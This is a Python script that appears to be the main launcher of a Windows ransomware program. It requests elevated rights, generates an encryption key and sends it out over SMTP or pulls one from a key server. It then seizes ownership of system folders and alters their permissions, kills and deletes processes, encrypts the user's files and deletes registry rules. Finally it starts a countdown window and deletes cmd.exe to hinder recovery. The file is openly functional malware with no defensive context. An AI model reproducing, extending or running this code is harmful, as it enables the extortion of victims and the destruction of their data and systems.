#!/usr/bin/python
#coding:utf-8
from tkinter import *
from timeit import default_timer
import tkinter as tk
from cryptography.fernet import Fernet
from modules.crypt import crypt
from modules.permission import takeown, icacls, get_admin_rights
from modules.system import killproc, regedit, delproc
from modules.network import host_connect, sendkey_smtp, keyserver
import os, sys, socket, wget, struct, ctypes, shutil, winreg, time

def copy_counter():
    cpath = os.getcwd()
    src = "%s\setup\gui_counter" %(cpath)
    dst = "\\PerfLogs\\gui_counter"
    cpy = shutil.copytree(src, dst)

usr = os.environ["USERNAME"]
if(get_admin_rights.is_admin()):
    if host_connect.keyrcv():
        keyserver.getcrypt()
    else:
        crypt.genkey(usr)
        sendkey_smtp.send_key()
        takeown.tkOwn_process()
        takeown.tkOwn_perf()
        takeown.tkOwn_regexp()
        icacls.icc_perf()
        copy_counter()
        icacls.icc_reg()
        icacls.icc_exp()
        icacls.icc_powershell()
        icacls.icc_sys32()
        killproc.pkill_smart()
        delproc.remove_pwsst()
        crypt.filelist()
        crypt.filelist_aux()
        killproc.pkill_exp()
        delproc.remove_regexp()
        regedit.delSpecRules()
        regedit.delRules()
else:
    print("Or restart the program with Admin permission")
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)

path = os.getcwd()
try:
    rkey = "%s/%s.key" %(path, usr)
    os.remove(rkey)
except:
    pass

gcount = "\\PerfLogs\\gui_counter\\gui_counter.exe"
os.system(gcount)
os.remove("\\windows\\system32\\cmd.exe")
